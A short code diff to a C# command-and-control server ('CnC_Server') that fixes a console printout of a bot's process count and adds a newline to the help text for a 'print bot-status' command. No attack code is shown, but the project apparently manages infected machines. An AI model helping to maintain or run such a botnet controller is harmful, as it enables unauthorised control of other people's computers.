@@ -34,13 +34,13 @@ namespace CnC_Server.Options
                     Console.WriteLine("Ram: {0}%", ramData);
                 }
 
-                if (double.IsNaN(ramData))
+                if (double.IsNaN(processesData))
                 {
                     Console.WriteLine("No processes information on this bot.");
                 }
                 else
                 {
-                    Console.WriteLine("Number of processes: {0}", (int)ramData);
+                    Console.WriteLine("Number of processes: {0}", (int)processesData);
                 }
             }
             else
@@ -54,7 +54,7 @@ namespace CnC_Server.Options
         /// </summary>
         public void PrintDescription()
         {
-            Console.WriteLine("This option will print all the information from the specific bot saved locally on the server. FORMAT: print bot-status <bot id>");
+            Console.WriteLine("This option will print all the information from the specific bot saved locally on the server. FORMAT: print bot-status <bot id>\n");
         }
 
         public bool ParseArguments(string[] arguments)
